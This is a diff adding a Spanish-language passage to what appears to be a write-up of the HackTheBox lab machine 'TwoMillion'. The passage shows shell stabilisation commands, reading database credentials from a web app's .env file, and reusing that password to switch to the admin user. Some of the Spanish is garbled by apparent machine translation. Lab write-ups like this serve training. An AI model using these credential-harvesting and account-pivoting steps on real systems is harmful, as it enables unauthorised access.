@@ -324,3 +324,69 @@ script /dev/null -c bash
 Script started, output log file is '/dev/null'.
 www-data@2million:~/html$ </code/
 </pre>
+stty raw -echo; fg
+reset xterm
+
+# Shell como administrador
+Empezamos a enumerar
+La raíz web está en la ubicación predeterminada, /var/www/html:
+
+<pre 
+  class="command-line" 
+  data-prompt="kali@kali $" 
+  data-output="4"
+><code class="language-bash"># Bash script with shell
+www-data@2million:~/html$ ls -la
+ls -la
+total 56
+drwxr-xr-x 10 root root 4096 Aug 29 00:30 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Aug 29 00:30 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views </code>
+</pre>
+
+ index.php define un montón de rutas para las diversas páginas y puntos de endo utilizados en el sitio web.
+
+Ahí es un .envficha también. Este archivo se utiliza comúnmente en los trabajos de marco web PHP para establecer variables de entorno para su uso por la aplicación. Esta aplicación es más flore a .envarchivo en lugar de usarlo en un marco, pero .envel archivo todavía se ve igual:
+
+
+<pre 
+  class="command-line" 
+  data-prompt="kali@kali $" 
+  data-output="4"
+><code class="language-bash"># Bash script with shell
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123 </code>
+</pre>
+
+# su / SSH
+
+Esa contraseña funciona para ambos sucomo administrador:
+
+<pre 
+  class="command-line" 
+  data-prompt="kali@kali $" 
+  data-output="4"
+><code class="language-bash"># Bash script with shell
+www-data@2million:~/html$ su - admin
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+admin@2million:~$ </code>
+
+</pre>
